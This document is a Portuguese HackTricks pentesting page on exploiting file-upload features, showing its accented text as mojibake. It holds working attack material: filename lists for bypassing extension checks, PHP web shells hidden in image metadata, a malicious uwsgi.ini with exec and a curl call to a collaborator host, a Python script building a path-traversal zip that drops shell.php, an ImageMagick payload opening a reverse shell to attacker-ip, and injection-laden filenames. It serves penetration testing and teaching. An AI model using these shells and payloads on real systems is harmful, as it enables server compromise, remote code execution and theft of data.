# Upload de Arquivo

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Se voc√™ est√° interessado em **carreira de hacking** e hackear o inquebr√°vel - **estamos contratando!** (_flu√™ncia em polon√™s escrito e falado √© necess√°ria_).

{% embed url="https://www.stmcyber.com/careers" %}

## Metodologia Geral de Upload de Arquivo

Outras extens√µes √∫teis:

* **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
* **Trabalhando em PHPv8**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
* **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
* **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
* **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
* **Flash**: _.swf_
* **Perl**: _.pl, .cgi_
* **Servidor Web Erlang Yaws**: _.yaws_

### Bypass de Verifica√ß√µes de Extens√£o de Arquivo

1. Se aplic√°vel, **verifique** as **extens√µes anteriores**. Teste tamb√©m usando algumas **letras mai√∫sculas**: _pHp, .pHP5, .PhAr ..._
2. _Verifique **adicionando uma extens√£o v√°lida antes** da extens√£o de execu√ß√£o (use tamb√©m as extens√µes anteriores):_
* _file.png.php_
* _file.png.Php5_
3. Tente adicionar **caracteres especiais no final**. Voc√™ pode usar o Burp para **for√ßar** todos os caracteres **ascii** e **Unicode**. (_Observe que voc√™ tamb√©m pode tentar usar as **extens√µes anteriormente** mencionadas_)
* _file.php%20_
* _file.php%0a_
* _file.php%00_
* _file.php%0d%0a_
* _file.php/_
* _file.php.\\_
* _file._
* _file.php...._
* _file.pHp5...._
4. Tente contornar as prote√ß√µes **enganando o analisador de extens√£o** do lado do servidor com t√©cnicas como **duplicar** a **extens√£o** ou **adicionar dados lixo** (bytes nulos) entre as extens√µes. _Voc√™ tamb√©m pode usar as **extens√µes anteriores** para preparar um payload melhor._
* _file.png.php_
* _file.png.pHp5_
* _file.php#.png_
* _file.php%00.png_
* _file.php\x00.png_
* _file.php%0a.png_
* _file.php%0d%0a.png_
* _file.phpJunk123png_
5. Adicione **outra camada de extens√µes** √† verifica√ß√£o anterior:
* _file.png.jpg.php_
* _file.php%00.png%00.jpg_
6. Tente colocar a **extens√£o de execu√ß√£o antes da extens√£o v√°lida** e reze para que o servidor esteja mal configurado. (√∫til para explorar configura√ß√µes incorretas do Apache onde qualquer coisa com a extens√£o\*\* _**.php**_**, mas** n√£o necessariamente terminando em .php\*\* executar√° c√≥digo):
* _ex: file.php.png_
7. Usando **fluxo de dados alternativo NTFS (ADS)** no **Windows**. Neste caso, um caractere de dois pontos ":" ser√° inserido ap√≥s uma extens√£o proibida e antes de uma permitida. Como resultado, um **arquivo vazio com a extens√£o proibida** ser√° criado no servidor (por exemplo, "file.asax:.jpg"). Este arquivo pode ser editado posteriormente usando outras t√©cnicas, como usar seu nome curto. O padr√£o ‚Äú**::$data**‚Äù tamb√©m pode ser usado para criar arquivos n√£o vazios. Portanto, adicionar um caractere de ponto ap√≥s esse padr√£o tamb√©m pode ser √∫til para contornar restri√ß√µes adicionais (por exemplo, ‚Äúfile.asp::$data.‚Äù)
8. Tente quebrar os limites do nome do arquivo. A extens√£o v√°lida √© cortada. E o PHP malicioso √© deixado. AAA<--SNIP-->AAA.php

```
# Linux m√°ximo 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # menos 4 aqui e adicionando .png
# Fa√ßa o upload do arquivo e verifique a resposta quantos caracteres ele permite. Digamos 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Fa√ßa o payload
AAA<--SNIP 232 A-->AAA.php.png
```
### Bypassar Tipo de Conte√∫do, N√∫mero M√°gico, Compress√£o e Redimensionamento

* Bypassar verifica√ß√µes de **Tipo de Conte√∫do** definindo o **valor** do **cabe√ßalho Content-Type** para: _image/png_, _text/plain_, application/octet-stream_
1. **Lista de palavras-chave de Content-Type**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
* Bypassar verifica√ß√£o de **n√∫mero m√°gico** adicionando no in√≠cio do arquivo os **bytes de uma imagem real** (confundir o comando _file_). Ou introduzir o shell dentro dos **metadados**:\
`exiftool -Comment="<?php echo 'Comando:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` ou voc√™ tamb√©m poderia **introduzir o payload diretamente** em uma imagem:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
* Se **compress√£o estiver sendo adicionada √† sua imagem**, por exemplo, usando algumas bibliotecas PHP padr√£o como [PHP-GD](https://www.php.net/manual/fr/book.image.php), as t√©cnicas anteriores n√£o ser√£o √∫teis. No entanto, voc√™ pode usar o **chunk PLTE** [**t√©cnica definida aqui**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) para inserir algum texto que **sobreviver√° √† compress√£o**.
* [**Github com o c√≥digo**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_plte\_png.php)
* A p√°gina da web tamb√©m pode estar **redimensionando** a **imagem**, usando, por exemplo, as fun√ß√µes PHP-GD `imagecopyresized` ou `imagecopyresampled`. No entanto, voc√™ pode usar o **chunk IDAT** [**t√©cnica definida aqui**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) para inserir algum texto que **sobreviver√° √† compress√£o**.
* [**Github com o c√≥digo**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_idat\_png.php)
* Outra t√©cnica para criar um payload que **sobrevive a um redimensionamento de imagem**, usando a fun√ß√£o PHP-GD `thumbnailImage`. No entanto, voc√™ pode usar o **chunk tEXt** [**t√©cnica definida aqui**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) para inserir algum texto que **sobreviver√° √† compress√£o**.
* [**Github com o c√≥digo**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_tEXt\_png.php)

### Outros Truques para Verificar

* Encontrar uma vulnerabilidade para **renomear** o arquivo j√° enviado (para alterar a extens√£o).
* Encontrar uma vulnerabilidade de **Inclus√£o de Arquivo Local** para executar a backdoor.
* **Poss√≠vel divulga√ß√£o de informa√ß√µes**:
1. Enviar **v√°rias vezes** (e ao **mesmo tempo**) o **mesmo arquivo** com o **mesmo nome**
2. Enviar um arquivo com o **nome** de um **arquivo** ou **pasta** que **j√° existe**
3. Enviar um arquivo com **‚Äú.‚Äù, ‚Äú..‚Äù, ou ‚Äú‚Ä¶‚Äù como seu nome**. Por exemplo, no Apache no **Windows**, se a aplica√ß√£o salvar os arquivos enviados no diret√≥rio ‚Äú/www/uploads/‚Äù, o nome de arquivo ‚Äú.‚Äù criar√° um arquivo chamado ‚Äúuploads‚Äù no diret√≥rio ‚Äú/www/‚Äù.
4. Enviar um arquivo que pode n√£o ser facilmente exclu√≠do, como **‚Äú‚Ä¶:.jpg‚Äù** no **NTFS** (Windows).
5. Enviar um arquivo no **Windows** com **caracteres inv√°lidos** como `|<>*?‚Äù` em seu nome (Windows).
6. Enviar um arquivo no **Windows** usando **nomes reservados** (**proibidos**) como CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8 e LPT9.
* Tente tamb√©m **enviar um execut√°vel** (.exe) ou um **.html** (menos suspeito) que **executar√° c√≥digo** quando aberto acidentalmente pela v√≠tima.

### Truques Especiais de Extens√£o

Se voc√™ est√° tentando enviar arquivos para um **servidor PHP**, [d√™ uma olhada no truque do **.htaccess** para executar c√≥digo](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess).\
Se voc√™ est√° tentando enviar arquivos para um **servidor ASP**, [d√™ uma olhada no truque do **.config** para executar c√≥digo](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Os arquivos `.phar` s√£o como os arquivos `.jar` para Java, mas para PHP, e podem ser **usados como um arquivo PHP** (executando-o com PHP, ou incluindo-o dentro de um script...)

A extens√£o `.inc` √© √†s vezes usada para arquivos PHP que s√£o apenas usados para **importar arquivos**, ent√£o, em algum momento, algu√©m poderia ter permitido **esta extens√£o ser executada**.

## **Jetty RCE**

Se voc√™ puder enviar um arquivo XML para um servidor Jetty, voc√™ pode obter [RCE porque **novos \*.xml e \*.war s√£o processados automaticamente**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Portanto, como mencionado na seguinte imagem, envie o arquivo XML para `$JETTY_BASE/webapps/` e espere a shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../.gitbook/assets/image (1) (3) (1) (1) (1).png>)

## **uWSGI RCE**

Para uma explora√ß√£o detalhada dessa vulnerabilidade, confira a pesquisa original: [Explora√ß√£o de RCE do uWSGI](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Vulnerabilidades de Execu√ß√£o Remota de Comandos (RCE) podem ser exploradas em servidores uWSGI se algu√©m tiver a capacidade de modificar o arquivo de configura√ß√£o `.ini`. Os arquivos de configura√ß√£o do uWSGI utilizam uma sintaxe espec√≠fica para incorporar vari√°veis "m√°gicas", espa√ßos reservados e operadores. Notavelmente, o operador '@', utilizado como `@(nome_do_arquivo)`, √© projetado para incluir o conte√∫do de um arquivo. Entre os v√°rios esquemas suportados no uWSGI, o esquema "exec" √© particularmente potente, permitindo a leitura de dados a partir da sa√≠da padr√£o de um processo. Essa funcionalidade pode ser manipulada para fins maliciosos, como Execu√ß√£o Remota de Comandos ou Escrita/Leitura Arbitr√°ria de Arquivos quando um arquivo de configura√ß√£o `.ini` √© processado.

Considere o seguinte exemplo de um arquivo `uwsgi.ini` prejudicial, demonstrando v√°rios esquemas:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
A execu√ß√£o da carga ocorre durante a an√°lise do arquivo de configura√ß√£o. Para que a configura√ß√£o seja ativada e analisada, o processo uWSGI deve ser reiniciado (potencialmente ap√≥s uma falha ou devido a um ataque de Nega√ß√£o de Servi√ßo) ou o arquivo deve ser configurado para recarregar automaticamente. O recurso de recarga autom√°tica, se ativado, recarrega o arquivo em intervalos especificados ao detectar altera√ß√µes.

√â crucial entender a natureza flex√≠vel da an√°lise de arquivos de configura√ß√£o do uWSGI. Especificamente, a carga discutida pode ser inserida em um arquivo bin√°rio (como uma imagem ou PDF), ampliando ainda mais o escopo de explora√ß√£o potencial.

## **Truque de Upload de Arquivo/SSRF do wget**

Em algumas ocasi√µes, voc√™ pode descobrir que um servidor est√° usando o **`wget`** para **baixar arquivos** e voc√™ pode **indicar** a **URL**. Nestes casos, o c√≥digo pode estar verificando se a extens√£o dos arquivos baixados est√° dentro de uma lista branca para garantir que apenas arquivos permitidos sejam baixados. No entanto, **esta verifica√ß√£o pode ser contornada.**\
O **comprimento m√°ximo** de um **nome de arquivo** no **Linux** √© **255**, no entanto, o **wget** trunca os nomes de arquivo para **236** caracteres. Voc√™ pode **baixar um arquivo chamado "A"\*232+".php"+".gif"**, este nome de arquivo ir√° **burlar** a **verifica√ß√£o** (como neste exemplo **".gif"** √© uma extens√£o **v√°lida**), mas o `wget` ir√° **renomear** o arquivo para **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‚ÄòAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php‚Äô

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‚ÄòAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php‚Äô saved [10/10]
```
Note que **outra op√ß√£o** que voc√™ pode estar pensando para contornar essa verifica√ß√£o √© fazer com que o **servidor HTTP redirecione para um arquivo diferente**, ent√£o a URL inicial ir√° contornar a verifica√ß√£o e ent√£o o wget ir√° baixar o arquivo redirecionado com o novo nome. Isso **n√£o funcionar√°** **a menos que** o wget esteja sendo usado com o **par√¢metro** `--trust-server-names` porque o **wget ir√° baixar a p√°gina redirecionada com o nome do arquivo indicado na URL original**.

## Ferramentas

* [Upload Bypass](https://github.com/sAjibuu/Upload\_Bypass) √© uma ferramenta poderosa projetada para ajudar Pentesters e Bug Hunters a testar mecanismos de upload de arquivos. Ele aproveita v√°rias t√©cnicas de recompensa por bugs para simplificar o processo de identifica√ß√£o e explora√ß√£o de vulnerabilidades, garantindo avalia√ß√µes completas de aplicativos da web.

## De Upload de Arquivo para outras vulnerabilidades

* Defina o **nome do arquivo** como `../../../tmp/lol.png` e tente alcan√ßar uma **travessia de caminho**
* Defina o **nome do arquivo** como `sleep(10)-- -.jpg` e voc√™ pode ser capaz de alcan√ßar uma **inje√ß√£o de SQL**
* Defina o **nome do arquivo** como `<svg onload=alert(document.domain)>` para alcan√ßar um XSS
* Defina o **nome do arquivo** como `; sleep 10;` para testar alguma inje√ß√£o de comando (mais [truques de inje√ß√£o de comando aqui](../command-injection.md))
* [**XSS** em upload de arquivo de imagem (svg)](../xss-cross-site-scripting/#xss-uploading-files-svg)
* Upload de arquivo **JS** + **XSS** = [Explora√ß√£o de **Service Workers**](../xss-cross-site-scripting/#xss-abusing-service-workers)
* [**XXE em upload de svg**](../xxe-xee-xml-external-entity.md#svg-file-upload)
* [**Redirecionamento Aberto** via upload de arquivo svg](../open-redirect.md#open-redirect-uploading-svg-files)
* Experimente **diferentes payloads svg** de [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)\*\*\*\*
* [Vulnerabilidade de **ImageTrick** famosa](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
* Se voc√™ puder **indicar ao servidor web para capturar uma imagem de uma URL** voc√™ poderia tentar abusar de um [SSRF](../ssrf-server-side-request-forgery/). Se esta **imagem** for **salva** em algum site **p√∫blico**, voc√™ tamb√©m poderia indicar uma URL de [https://iplogger.org/invisible/](https://iplogger.org/invisible/) e **roubar informa√ß√µes de cada visitante**.
* [**XXE e CORS** bypass com upload de PDF-Adobe](pdf-upload-xxe-and-cors-bypass.md)
* PDFs especialmente elaborados para XSS: A [p√°gina seguinte apresenta como **injetar dados de PDF para obter execu√ß√£o de JS**](../xss-cross-site-scripting/pdf-injection.md). Se voc√™ puder fazer upload de PDFs, voc√™ poderia preparar alguns PDFs que executar√£o JS arbitr√°rio seguindo as indica√ß√µes fornecidas.
* Fa√ßa o upload do conte√∫do \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) para verificar se o servidor possui algum **antiv√≠rus**
* Verifique se h√° algum **limite de tamanho** para upload de arquivos

Aqui est√° uma lista dos 10 principais itens que voc√™ pode alcan√ßar fazendo upload (de [aqui](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: XSS armazenado / SSRF / XXE
3. **GIF**: XSS armazenado / SSRF
4. **CSV**: inje√ß√£o de CSV
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : inje√ß√£o de HTML / XSS / Redirecionamento aberto
8. **PNG / JPEG**: Ataque de inunda√ß√£o de pixels (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Extens√£o Burp

{% embed url="https://github.com/portswigger/upload-scanner" %}

## Bytes de Cabe√ßalho M√°gico

* **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
* **JPG**: `"\xff\xd8\xff"`

Consulte [https://en.wikipedia.org/wiki/List\_of\_file\_signatures](https://en.wikipedia.org/wiki/List\_of\_file\_signatures) para outros tipos de arquivos.

### Upload Autom√°tico de Arquivo Zip/Tar Descompactado

Se voc√™ puder fazer upload de um ZIP que ser√° descompactado dentro do servidor, voc√™ pode fazer 2 coisas:

#### Symlink

Fa√ßa upload de um link contendo links simb√≥licos para outros arquivos e, em seguida, acessando os arquivos descompactados, voc√™ acessar√° os arquivos vinculados:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Descompactar em pastas diferentes

A cria√ß√£o inesperada de arquivos em diret√≥rios durante a descompacta√ß√£o √© um problema significativo. Apesar das suposi√ß√µes iniciais de que essa configura√ß√£o poderia proteger contra a execu√ß√£o de comandos em n√≠vel de sistema operacional por meio de uploads de arquivos maliciosos, o suporte √† compress√£o hier√°rquica e as capacidades de travessia de diret√≥rios do formato de arquivo ZIP podem ser explorados. Isso permite que os atacantes ignorem restri√ß√µes e escapem de diret√≥rios de upload seguros manipulando a funcionalidade de descompress√£o do aplicativo alvo.

Um exploit automatizado para criar esses arquivos est√° dispon√≠vel em [**evilarc no GitHub**](https://github.com/ptoomey3/evilarc). A utilidade pode ser usada da seguinte maneira:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Al√©m disso, o **truque de symlink com evilarc** √© uma op√ß√£o. Se o objetivo √© direcionar um arquivo como `/flag.txt`, um symlink para esse arquivo deve ser criado em seu sistema. Isso garante que o evilarc n√£o encontre erros durante sua opera√ß√£o.

Abaixo est√° um exemplo de c√≥digo Python usado para criar um arquivo zip malicioso:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abusando da compress√£o para pulveriza√ß√£o de arquivos**

Para mais detalhes, **verifique a postagem original em**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1. **Criando um Shell PHP**: O c√≥digo PHP √© escrito para executar comandos passados atrav√©s da vari√°vel `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```
2. **Pulveriza√ß√£o de Arquivos e Cria√ß√£o de Arquivo Comprimido**: M√∫ltiplos arquivos s√£o criados e um arquivo zip √© montado contendo esses arquivos.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```
3. **Modifica√ß√£o com um Editor Hexadecimal ou vi**: Os nomes dos arquivos dentro do zip s√£o alterados usando vi ou um editor hexadecimal, mudando "xxA" para "../" para percorrer diret√≥rios.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Incorporando Shell PHP em PNG

Incorporar um shell PHP no chunk IDAT de um arquivo PNG pode contornar efetivamente certas opera√ß√µes de processamento de imagem. As fun√ß√µes `imagecopyresized` e `imagecopyresampled` do PHP-GD s√£o particularmente relevantes nesse contexto, pois s√£o comumente usadas para redimensionar e reamostrar imagens, respectivamente. A capacidade do shell PHP incorporado de permanecer inalterado por essas opera√ß√µes √© uma vantagem significativa para determinados casos de uso.

Uma explora√ß√£o detalhada dessa t√©cnica, incluindo sua metodologia e aplica√ß√µes potenciais, √© fornecida no seguinte artigo: ["Codificando Shells Web em chunks IDAT de PNG"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Este recurso oferece uma compreens√£o abrangente do processo e suas implica√ß√µes.

Mais informa√ß√µes em: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Arquivos Poliglotas

Arquivos poliglotas atuam como uma ferramenta √∫nica em ciberseguran√ßa, agindo como camale√µes que podem existir validamente em m√∫ltiplos formatos de arquivo simultaneamente. Um exemplo intrigante √© um [GIFAR](https://en.wikipedia.org/wiki/Gifar), um h√≠brido que funciona tanto como um GIF quanto como um arquivo RAR. Tais arquivos n√£o se limitam a essa combina√ß√£o; combina√ß√µes como GIF e JS ou PPT e JS tamb√©m s√£o vi√°veis.

A utilidade central dos arquivos poliglotas reside em sua capacidade de contornar medidas de seguran√ßa que filtram arquivos com base no tipo. A pr√°tica comum em v√°rias aplica√ß√µes envolve permitir apenas certos tipos de arquivo para upload, como JPEG, GIF ou DOC, para mitigar o risco representado por formatos potencialmente prejudiciais (por exemplo, arquivos JS, PHP ou Phar). No entanto, um poliglota, ao se conformar aos crit√©rios estruturais de m√∫ltiplos tipos de arquivo, pode contornar essas restri√ß√µes de forma furtiva.

Apesar de sua adaptabilidade, os poliglotas encontram limita√ß√µes. Por exemplo, enquanto um poliglota pode simultaneamente incorporar um arquivo PHAR (PHp ARchive) e um JPEG, o sucesso de seu upload pode depender das pol√≠ticas de extens√£o de arquivo da plataforma. Se o sistema for rigoroso em rela√ß√£o √†s extens√µes permitidas, a mera dualidade estrutural de um poliglota pode n√£o ser suficiente para garantir seu upload.

Mais informa√ß√µes em: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

## Refer√™ncias

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
* [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
* [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
* [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
* [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
* [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Se voc√™ est√° interessado em uma **carreira de hacking** e hackear o inhacke√°vel - **estamos contratando!** (_flu√™ncia em polon√™s escrita e falada necess√°ria_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
